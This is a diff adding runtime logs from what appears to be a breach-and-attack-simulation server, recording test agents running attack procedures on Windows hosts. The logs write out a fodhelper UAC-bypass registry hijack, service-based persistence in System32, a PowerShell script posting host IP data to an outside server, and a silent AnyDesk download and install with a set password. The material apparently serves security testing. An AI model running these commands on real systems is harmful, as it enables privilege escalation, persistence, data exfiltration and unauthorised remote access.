@@ -8443,3 +8443,306 @@ INFO Prefork: 			Disabled
 INFO PID: 			1225560
 INFO Total process count: 	1
 
+Error reading from connection: read tcp 192.168.1.4:8080->199.45.155.68:35500: read: connection reset by peer
+Invalid Command
+Error reading from connection: read tcp 192.168.1.4:8080->199.45.155.68:38432: read: connection reset by peer
+Invalid Command
+ApplicationDB logging
+{agent_uuid}
+Error reading from connection: EOF
+Invalid Command
+Invalid Command
+Invalid Command
+Invalid Command
+Invalid Command
+panic: runtime error: makeslice: len out of range
+
+goroutine 372589 [running]:
+github.com/HTTPs-omma/HTTPsBAS-HSProtocol/HSProtocol.(*HSProtocolManager).Parsing(0x0?, {0xc003908000, 0x100000, 0x100000})
+	/root/golang/pkg/mod/github.com/!h!t!t!ps-omma/!h!t!t!ps!b!a!s-!h!s!protocol@v1.0.14/HSProtocol/HSProtocol.go:122 +0x6a
+main.handleTCPConnection({0x124f0d8, 0xc000c80530})
+	/root/GIT/HTTPsBAS-ManagingServer/main.go:106 +0xf7
+created by main.TCPServer in goroutine 16
+	/root/GIT/HTTPsBAS-ManagingServer/main.go:86 +0x1f8
+exit status 2
+HTTP server listening on port 80
+[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.
+
+[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
+ - using env:	export GIN_MODE=release
+ - using code:	gin.SetMode(gin.ReleaseMode)
+
+[GIN-debug] GET    /swagger/*any             --> github.com/swaggo/gin-swagger.CustomWrapHandler.func1 (3 handlers)
+[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.
+Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.
+[GIN-debug] Listening and serving HTTP on 0.0.0.0:8001
+
+    _______ __             
+   / ____(_) /_  ___  _____
+  / /_  / / __ \/ _ \/ ___/
+ / __/ / / /_/ /  __/ /    
+/_/   /_/_.___/\___/_/          v3.0.0-beta.3
+--------------------------------------------------
+INFO Server started on: 	http://127.0.0.1:80 (bound on host 0.0.0.0 and port 80)
+INFO Total handlers count: 	18
+INFO Prefork: 			Disabled
+INFO PID: 			1306201
+INFO Total process count: 	1
+
+TCP server listening on port 8080
+HTTP server listening on port 80
+[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.
+
+[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
+ - using env:	export GIN_MODE=release
+ - using code:	gin.SetMode(gin.ReleaseMode)
+
+TCP server listening on port 8080
+
+    _______ __             
+   / ____(_) /_  ___  _____
+  / /_  / / __ \/ _ \/ ___/
+ / __/ / / /_/ /  __/ /    
+/_/   /_/_.___/\___/_/          v3.0.0-beta.3
+--------------------------------------------------
+INFO Server started on: 	http://127.0.0.1:80 (bound on host 0.0.0.0 and port 80)
+INFO Total handlers count: 	18
+INFO Prefork: 			Disabled
+INFO PID: 			1307006
+INFO Total process count: 	1
+
+[GIN-debug] GET    /swagger/*any             --> github.com/swaggo/gin-swagger.CustomWrapHandler.func1 (3 handlers)
+[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.
+Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.
+[GIN-debug] Listening and serving HTTP on 0.0.0.0:8001
+&{0 P_PrivilegeEscalation_0001 5610eb3154c742d4bc95ce9194166ac4 b347f15810394067b090298b3274a084 ExecutePayLoad 2024-10-03 23:08:08.511507566 +0900 KST m=+732.738376200}
+&{ObjectID("000000000000000000000000") 5610eb3154c742d4bc95ce9194166ac4 P_PrivilegeEscalation_0001 b347f15810394067b090298b3274a084 2024-10-03 07:08:21.9847536 -0700 -0700 1 
+
+    Hive: HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open
+
+
+Name                           Property                                                                                
+----                           --------                                                                                
+command                                                                                                                
+
+
+ New-Item -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Force; Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name '(default)' -Value 'cmd.exe /c start '#'{agent.exe}'; Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value ''; Start-Process "fodhelper.exe"}
+Inserted document with ID: ObjectID("66fea5568c78f6084ac44b36")
+&{0 P_Persistence_0001 5610eb3154c742d4bc95ce9194166ac4 e124129fa3f64c3b987f0effe22db66b ExecutePayLoad 2024-10-03 23:08:32.24809054 +0900 KST m=+756.474959174}
+&{ObjectID("000000000000000000000000") 5610eb3154c742d4bc95ce9194166ac4 P_Persistence_0001 e124129fa3f64c3b987f0effe22db66b 2024-10-03 07:08:34.3560464 -0700 -0700 -1 exit status 5 copy "C:\Users\User\Desktop\agent.exe" "C:\Windows\System32\agent.exe" & sc create BASAgent binPath= "C:\Windows\System32\agent.exe" start= auto}
+Inserted document with ID: ObjectID("66fea5628c78f6084ac44b38")
+&{0 P_Persistence_0001 5610eb3154c742d4bc95ce9194166ac4 b72e8564dbe7475b86b330b1078957c0 ExecutePayLoad 2024-10-03 23:11:13.144441118 +0900 KST m=+917.371310170}
+&{ObjectID("000000000000000000000000") 5610eb3154c742d4bc95ce9194166ac4 P_Persistence_0001 b72e8564dbe7475b86b330b1078957c0 2024-10-03 07:11:14.7060594 -0700 -0700 -1 exit status 5 copy "C:\Users\User\Desktop\agent.exe" "C:\Windows\System32\agent.exe" & sc create BASAgent binPath= "C:\Windows\System32\agent.exe" start= auto}
+Inserted document with ID: ObjectID("66fea6028c78f6084ac44b40")
+&{0 P_Persistence_0001 5610eb3154c742d4bc95ce9194166ac4 22b7ff89b43743db911636fcb2252d66 ExecutePayLoad 2024-10-03 23:12:13.263050616 +0900 KST m=+977.489919669}
+&{ObjectID("000000000000000000000000") 5610eb3154c742d4bc95ce9194166ac4 P_Persistence_0001 22b7ff89b43743db911636fcb2252d66 2024-10-03 07:12:14.5047674 -0700 -0700 -1 exit status 1073 copy "C:\Users\User\Desktop\agent.exe" "C:\Windows\System32\agent.exe" & sc create BASAgent binPath= "C:\Windows\System32\agent.exe" start= auto}
+Inserted document with ID: ObjectID("66fea63e8c78f6084ac44b44")
+&{0 P_Persistence_0001 5610eb3154c742d4bc95ce9194166ac4 d2139bb927bf4802bd7d97aa49404b40 ExecuteCleanUp 2024-10-03 23:12:29.716225998 +0900 KST m=+993.943095120}
+&{ObjectID("000000000000000000000000") 5610eb3154c742d4bc95ce9194166ac4 P_Persistence_0001 d2139bb927bf4802bd7d97aa49404b40 2024-10-03 07:12:29.8270427 -0700 -0700 1 
+C:\Users\User\Desktop>sc stop BASAgent   & sc delete BASAgent   & del "C:\Windows\System32\agent.exe" 
+[SC] ControlService FAILED 1062:
+
+The service has not been started.
+
+[SC] DeleteService SUCCESS
+ copy "C:\Users\User\Desktop\agent.exe" "C:\Windows\System32\agent.exe" & sc create BASAgent binPath= "C:\Windows\System32\agent.exe" start= auto}
+Inserted document with ID: ObjectID("66fea64d8c78f6084ac44b46")
+&{0 P_Persistence_0001 5610eb3154c742d4bc95ce9194166ac4 4787f59bc80648bcae07f1bb7d22c3cb ExecutePayLoad 2024-10-03 23:12:42.842111095 +0900 KST m=+1007.068980148}
+&{ObjectID("000000000000000000000000") 5610eb3154c742d4bc95ce9194166ac4 P_Persistence_0001 4787f59bc80648bcae07f1bb7d22c3cb 2024-10-03 07:12:45.1921497 -0700 -0700 1 
+C:\Users\User\Desktop>copy "C:\Users\User\Desktop\agent.exe" "C:\Windows\System32\agent.exe"   & sc create BASAgent binPath= "C:\Windows\System32\agent.exe" start= auto 
+        1 file(s) copied.
+[SC] CreateService SUCCESS
+ copy "C:\Users\User\Desktop\agent.exe" "C:\Windows\System32\agent.exe" & sc create BASAgent binPath= "C:\Windows\System32\agent.exe" start= auto}
+Inserted document with ID: ObjectID("66fea65d8c78f6084ac44b48")
+&{0 P_Discovery_0001 5610eb3154c742d4bc95ce9194166ac4 a67fbde14e2c490c9952994c72a399b6 ExecutePayLoad 2024-10-03 23:13:09.798730717 +0900 KST m=+1034.025599840}
+================================================
+================================================
+{[192.168.56.136 192.168.136.129] 223.195.37.233 }
+&{ObjectID("000000000000000000000000") 5610eb3154c742d4bc95ce9194166ac4 P_Discovery_0001 a67fbde14e2c490c9952994c72a399b6 2024-10-03 07:13:26.3408122 -0700 -0700 1  $PrivateIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -like '10.*' -or $_.IPAddress -like '172.1[6-9].*' -or $_.IPAddress -like '172.2[0-9].*' -or $_.IPAddress -like '172.3[0-1].*' -or $_.IPAddress -like '192.168.*.*' }).IPAddress; $PublicIP = (Invoke-WebRequest -Uri "http://ifconfig.me").Content.Trim(); $agentUUID = "5610eb3154c742d4bc95ce9194166ac4"; $Data = @{ PrivateIP = $PrivateIP; PublicIP = $PublicIP; agentUUID = $agentUUID }; function replaceAgentUUID { param($uuid) $global:Data.agentUUID = $uuid }; Invoke-RestMethod -Uri "http://uskawjdu.iptime.org/ipinfo" -Method Post -Body ($Data | ConvertTo-Json) -ContentType "application/json" | Out-Null}
+Inserted document with ID: ObjectID("66fea6868c78f6084ac44b4c")
+&{0  P_Persistence_0002 5610eb3154c742d4bc95ce9194166ac4 9a616b68b12b4b13921f2dedddf78f0e ExecutePayLoad 2024-10-03 23:13:37.675846374 +0900 KST m=+1061.902715427}
+job procedure not found
+&{0 P_Persistence_0002 5610eb3154c742d4bc95ce9194166ac4 1399521ce46543feaf61d9a5943727f1 ExecutePayLoad 2024-10-03 23:13:47.276754326 +0900 KST m=+1071.503623379}
+job procedure not found
+&{0 P_CommandAndControl_0004.yaml2 5610eb3154c742d4bc95ce9194166ac4 f846710ae29f409381a3ed97062d1548 ExecutePayLoad 2024-10-03 23:16:17.355472884 +0900 KST m=+1221.582341937}
+job procedure not found
+&{0 P_CommandAndControl_0004 5610eb3154c742d4bc95ce9194166ac4 a4b2d26d040843b59b3f7316f56bcc41 ExecutePayLoad 2024-10-03 23:16:21.12930875 +0900 KST m=+1225.356178292}
+Invalid Command
+Error reading from connection: EOF
+&{ObjectID("000000000000000000000000") 5610eb3154c742d4bc95ce9194166ac4 P_CommandAndControl_0004 a4b2d26d040843b59b3f7316f56bcc41 2024-10-03 07:25:05.6366268 -0700 -0700 -1 command execution failed: Exception calling "DownloadFile" with "2" argument(s): "The operation has timed out."
+At line:1 char:130
++ ... "C:\ProgramData\AnyDesk.exe"; $clnt.DownloadFile($url, $file); cmd.ex ...
++                                   ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotSpecified: (:) [], MethodInvocationException
+    + FullyQualifiedErrorId : WebException
+ 
+'C:\ProgramData\AnyDesk.exe' is not recognized as an internal or external command,
+operable program or batch file.
+C:\ProgramData\anydesk.exe : The term 'C:\ProgramData\anydesk.exe' is not recognized as the name of a cmdlet, 
+function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the 
+path is correct and try again.
+At line:1 char:290
++ ... lent; cmd.exe /c echo "httpsbas" | C:\ProgramData\anydesk.exe --set-p ...
++                                        ~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : ObjectNotFound: (C:\ProgramData\anydesk.exe:String) [], CommandNotFoundException
+    + FullyQualifiedErrorId : CommandNotFoundException
+ 
+, error: exit status 1 $clnt = new-object System.Net.WebClient; $url = "http://download.anydesk.com/AnyDesk.exe"; $file = "C:\ProgramData\AnyDesk.exe"; $clnt.DownloadFile($url, $file); cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent; cmd.exe /c echo "httpsbas" | C:\ProgramData\anydesk.exe --set-password}
+Inserted document with ID: ObjectID("66fea94d8c78f6084ac44b66")
+&{0 P_Discovery_0001 5610eb3154c742d4bc95ce9194166ac4 6807a0c03953449ea47a08d8e80ecb88 ExecutePayLoad 2024-10-03 23:26:10.309082988 +0900 KST m=+1814.535951621}
+================================================
+================================================
+{[192.168.56.136 192.168.136.129] 223.195.37.233 }
+&{ObjectID("000000000000000000000000") 5610eb3154c742d4bc95ce9194166ac4 P_Discovery_0001 6807a0c03953449ea47a08d8e80ecb88 2024-10-03 07:26:25.5708264 -0700 -0700 1 
+Name                           Value                                                                                   
+----                           -----                                                                                   
+agentUUID                      5610eb3154c742d4bc95ce9194166ac4                                                        
+PrivateIP                      {192.168.56.136, 192.168.136.129}                                                       
+PublicIP                       223.195.37.233                                                                          
+
+
+ $PrivateIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -like '10.*' -or $_.IPAddress -like '172.1[6-9].*' -or $_.IPAddress -like '172.2[0-9].*' -or $_.IPAddress -like '172.3[0-1].*' -or $_.IPAddress -like '192.168.*.*' }).IPAddress; $PublicIP = (Invoke-WebRequest -Uri "http://ifconfig.me").Content.Trim(); $agentUUID = "5610eb3154c742d4bc95ce9194166ac4"; $Data = @{ PrivateIP = $PrivateIP; PublicIP = $PublicIP; agentUUID = $agentUUID }; function replaceAgentUUID { param($uuid) $global:Data.agentUUID = $uuid }; Invoke-RestMethod -Uri "http://uskawjdu.iptime.org/ipinfo" -Method Post -Body ($Data | ConvertTo-Json) -ContentType "application/json" | Out-Null; echo $Data}
+Inserted document with ID: ObjectID("66fea9918c78f6084ac44b70")
+&{0 P_Discovery_0001 5610eb3154c742d4bc95ce9194166ac4 178479918dca47b1a26a20a6a6df94fb ExecutePayLoad 2024-10-03 23:26:44.760131051 +0900 KST m=+1848.987000523}
+================================================
+================================================
+{[192.168.56.136 192.168.136.129] 223.195.37.233 }
+&{ObjectID("000000000000000000000000") 5610eb3154c742d4bc95ce9194166ac4 P_Discovery_0001 178479918dca47b1a26a20a6a6df94fb 2024-10-03 07:26:48.4892012 -0700 -0700 1 {
+    "agentUUID":  "5610eb3154c742d4bc95ce9194166ac4",
+    "PrivateIP":  [
+                      "192.168.56.136",
+                      "192.168.136.129"
+                  ],
+    "PublicIP":  "223.195.37.233"
+}
+ $PrivateIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -like '10.*' -or $_.IPAddress -like '172.1[6-9].*' -or $_.IPAddress -like '172.2[0-9].*' -or $_.IPAddress -like '172.3[0-1].*' -or $_.IPAddress -like '192.168.*.*' }).IPAddress; $PublicIP = (Invoke-WebRequest -Uri "http://ifconfig.me").Content.Trim(); $agentUUID = "5610eb3154c742d4bc95ce9194166ac4"; $Data = @{ PrivateIP = $PrivateIP; PublicIP = $PublicIP; agentUUID = $agentUUID }; function replaceAgentUUID { param($uuid) $global:Data.agentUUID = $uuid }; Invoke-RestMethod -Uri "http://uskawjdu.iptime.org/ipinfo" -Method Post -Body ($Data | ConvertTo-Json) -ContentType "application/json" | Out-Null; echo ($Data | ConvertTo-Json)}
+Inserted document with ID: ObjectID("66fea9a88c78f6084ac44b7c")
+Invalid Command
+panic: runtime error: makeslice: len out of range
+
+goroutine 261562 [running]:
+github.com/HTTPs-omma/HTTPsBAS-HSProtocol/HSProtocol.(*HSProtocolManager).Parsing(0x0?, {0xc003598000, 0x100000, 0x100000})
+	/root/golang/pkg/mod/github.com/!h!t!t!ps-omma/!h!t!t!ps!b!a!s-!h!s!protocol@v1.0.14/HSProtocol/HSProtocol.go:122 +0x6a
+main.handleTCPConnection({0x124f0d8, 0xc00023c368})
+	/root/GIT/HTTPsBAS-ManagingServer/main.go:106 +0xf7
+created by main.TCPServer in goroutine 10
+	/root/GIT/HTTPsBAS-ManagingServer/main.go:86 +0x1f8
+exit status 2
+HTTP server listening on port 80
+[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.
+
+[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
+ - using env:	export GIN_MODE=release
+ - using code:	gin.SetMode(gin.ReleaseMode)
+
+[GIN-debug] GET    /swagger/*any             --> github.com/swaggo/gin-swagger.CustomWrapHandler.func1 (3 handlers)
+[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.
+Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.
+[GIN-debug] Listening and serving HTTP on 0.0.0.0:8001
+
+    _______ __             
+   / ____(_) /_  ___  _____
+  / /_  / / __ \/ _ \/ ___/
+ / __/ / / /_/ /  __/ /    
+/_/   /_/_.___/\___/_/          v3.0.0-beta.3
+--------------------------------------------------
+INFO Server started on: 	http://127.0.0.1:80 (bound on host 0.0.0.0 and port 80)
+INFO Total handlers count: 	18
+INFO Prefork: 			Disabled
+INFO PID: 			1342649
+INFO Total process count: 	1
+
+TCP server listening on port 8080
+&{0 P_Discovery_0001 5610eb3154c742d4bc95ce9194166ac4 11918108000a49fe9b476f0d6a792531 ExecutePayLoad 2024-10-03 23:29:55.884560497 +0900 KST m=+124.115277999}
+================================================
+================================================
+{[192.168.56.136 192.168.136.129] 223.195.37.233 }
+&{ObjectID("000000000000000000000000") 5610eb3154c742d4bc95ce9194166ac4 P_Discovery_0001 11918108000a49fe9b476f0d6a792531 2024-10-03 07:30:09.3973984 -0700 -0700 1 {
+    "agentUUID":  "5610eb3154c742d4bc95ce9194166ac4",
+    "PrivateIP":  [
+                      "192.168.56.136",
+                      "192.168.136.129"
+                  ],
+    "PublicIP":  "223.195.37.233"
+}
+ $PrivateIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -like '10.*' -or $_.IPAddress -like '172.1[6-9].*' -or $_.IPAddress -like '172.2[0-9].*' -or $_.IPAddress -like '172.3[0-1].*' -or $_.IPAddress -like '192.168.*.*' }).IPAddress; $PublicIP = (Invoke-WebRequest -Uri "http://ifconfig.me").Content.Trim(); $agentUUID = "5610eb3154c742d4bc95ce9194166ac4"; $Data = @{ PrivateIP = $PrivateIP; PublicIP = $PublicIP; agentUUID = $agentUUID }; function replaceAgentUUID { param($uuid) $global:Data.agentUUID = $uuid }; Invoke-RestMethod -Uri "http://uskawjdu.iptime.org/ipinfo" -Method Post -Body ($Data | ConvertTo-Json) -ContentType "application/json" | Out-Null; echo ($Data | ConvertTo-Json)}
+Inserted document with ID: ObjectID("66feaa71de5b71b54e158712")
+ApplicationDB logging
+23291ba928c74d958510765842a3665f
+&{0 P_PrivilegeEscalation_0001 23291ba928c74d958510765842a3665f 88763104860f4b5fa8b7fcf1f07443f6 ExecutePayLoad 2024-10-03 23:34:05.608976015 +0900 KST m=+373.839693516}
+&{0 P_Persistence_0001 23291ba928c74d958510765842a3665f 98ab80b4d2d342148987bca072db8dcd ExecutePayLoad 2024-10-03 23:34:05.659979478 +0900 KST m=+373.890697050}
+&{0 P_Discovery_0001 23291ba928c74d958510765842a3665f f0d16ed0dc85455ba9fc188b8ce1e62f ExecutePayLoad 2024-10-03 23:34:05.702922183 +0900 KST m=+373.933639685}
+&{0 P_CommandAndControl_0004 23291ba928c74d958510765842a3665f 53bd730e1189410b901971eb6b3396ff ExecutePayLoad 2024-10-03 23:34:05.752623789 +0900 KST m=+373.983340872}
+&{ObjectID("000000000000000000000000") 23291ba928c74d958510765842a3665f P_PrivilegeEscalation_0001 88763104860f4b5fa8b7fcf1f07443f6 2024-10-03 23:37:15.3397465 +0900 KST 1 
+
+    Hive: HKEY_CURRENT_USER\Software\Classes\ms-settings\shell\open
+
+
+Name                           Property                                                               
+----                           --------                                                               
+command                                                                                               
+
+
+ New-Item -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Force; Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name '(default)' -Value 'cmd.exe /c start '#'{agent.exe}'; Set-ItemProperty -Path 'HKCU:\Software\Classes\ms-settings\shell\open\command' -Name 'DelegateExecute' -Value ''; Start-Process "fodhelper.exe"}
+Inserted document with ID: ObjectID("66feac1cde5b71b54e158741")
+&{ObjectID("000000000000000000000000") 23291ba928c74d958510765842a3665f P_Persistence_0001 98ab80b4d2d342148987bca072db8dcd 2024-10-03 23:37:21.3890225 +0900 KST -1 exit status 5 copy "C:\Users\user\Desktop\agent.exe" "C:\Windows\System32\agent.exe" & sc create BASAgent binPath= "C:\Windows\System32\agent.exe" start= auto}
+Inserted document with ID: ObjectID("66feac22de5b71b54e158743")
+================================================
+&{ObjectID("000000000000000000000000") 23291ba928c74d958510765842a3665f P_Discovery_0001 f0d16ed0dc85455ba9fc188b8ce1e62f 2024-10-03 23:38:07.1624262 +0900 KST 1 Invoke-WebRequest : Internet Explorer ������ ������ �� ���ų� Internet Explorer�� ���� ���� ������ ��
+������ �ʾ� ���� �������� ���� �м��� �� �����ϴ�. UseBasicParsing �Ű� ������ �����ϰ� �ٽ� �õ��Ͻ�
+�ÿ�. 
+��ġ ��:1 ����:273
++ ... ess; $PublicIP = (Invoke-WebRequest -Uri "http://ifconfig.me").Conten ...
++                       ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : NotImplemented: (:) [Invoke-WebRequest], NotSupportedException
+    + FullyQualifiedErrorId : WebCmdletIEDomNotSupportedException,Microsoft.PowerShell.Commands.Invok 
+   eWebRequestCommand
+ 
+Invoke-RestMethod : Invalid request : Json Parsing Failed
+��ġ ��:1 ����:541
++ ...  = $uuid }; Invoke-RestMethod -Uri "http://uskawjdu.iptime.org/ipinfo ...
++                 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+    + CategoryInfo          : InvalidOperation: (System.Net.HttpWebRequest:HttpWebRequest) [Invoke-Re 
+   stMethod], WebException
+    + FullyQualifiedErrorId : WebCmdletWebResponseException,Microsoft.PowerShell.Commands.InvokeRestM 
+   ethodCommand
+{
+    "agentUUID":  "23291ba928c74d958510765842a3665f",
+    "PrivateIP":  "192.168.74.136",
+    "PublicIP":  null
+}
+ $PrivateIP = (Get-NetIPAddress -AddressFamily IPv4 | Where-Object { $_.IPAddress -like '10.*' -or $_.IPAddress -like '172.1[6-9].*' -or $_.IPAddress -like '172.2[0-9].*' -or $_.IPAddress -like '172.3[0-1].*' -or $_.IPAddress -like '192.168.*.*' }).IPAddress; $PublicIP = (Invoke-WebRequest -Uri "http://ifconfig.me").Content.Trim(); $agentUUID = "23291ba928c74d958510765842a3665f"; $Data = @{ PrivateIP = $PrivateIP; PublicIP = $PublicIP; agentUUID = $agentUUID }; function replaceAgentUUID { param($uuid) $global:Data.agentUUID = $uuid }; Invoke-RestMethod -Uri "http://uskawjdu.iptime.org/ipinfo" -Method Post -Body ($Data | ConvertTo-Json) -ContentType "application/json" | Out-Null; echo ($Data | ConvertTo-Json)}
+Inserted document with ID: ObjectID("66feac4fde5b71b54e158747")
+[GIN] 2024/10/03 - 23:43:41 | 200 |     372.119µs |  223.195.37.233 | GET      "/swagger/index.html"
+[GIN] 2024/10/03 - 23:43:41 | 200 |     7.33014ms |  223.195.37.233 | GET      "/swagger/swagger-ui.css"
+[GIN] 2024/10/03 - 23:43:41 | 200 |   18.927913ms |  223.195.37.233 | GET      "/swagger/swagger-ui-standalone-preset.js"
+[GIN] 2024/10/03 - 23:43:41 | 200 |   77.279884ms |  223.195.37.233 | GET      "/swagger/swagger-ui-bundle.js"
+[GIN] 2024/10/03 - 23:43:41 | 200 |      60.483µs |  223.195.37.233 | GET      "/swagger/favicon-32x32.png"
+[GIN] 2024/10/03 - 23:43:42 | 200 |     232.365µs |  223.195.37.233 | GET      "/swagger/doc.json"
+signal: terminated
+HTTP server listening on port 80
+[GIN-debug] [WARNING] Creating an Engine instance with the Logger and Recovery middleware already attached.
+
+[GIN-debug] [WARNING] Running in "debug" mode. Switch to "release" mode in production.
+ - using env:	export GIN_MODE=release
+ - using code:	gin.SetMode(gin.ReleaseMode)
+
+
+    _______ __             
+   / ____(_) /_  ___  _____
+  / /_  / / __ \/ _ \/ ___/
+ / __/ / / /_/ /  __/ /    
+/_/   /_/_.___/\___/_/          v3.0.0-beta.3
+--------------------------------------------------
+[GIN-debug] GET    /swagger/*any             --> github.com/swaggo/gin-swagger.CustomWrapHandler.func1 (3 handlers)
+[GIN-debug] [WARNING] You trusted all proxies, this is NOT safe. We recommend you to set a value.
+Please check https://pkg.go.dev/github.com/gin-gonic/gin#readme-don-t-trust-all-proxies for details.
+[GIN-debug] Listening and serving HTTP on 0.0.0.0:8001
+TCP server listening on port 8080
+INFO Server started on: 	http://127.0.0.1:80 (bound on host 0.0.0.0 and port 80)
+INFO Total handlers count: 	18
+INFO Prefork: 			Disabled
+INFO PID: 			1377961
+INFO Total process count: 	1
+
+signal: interrupt
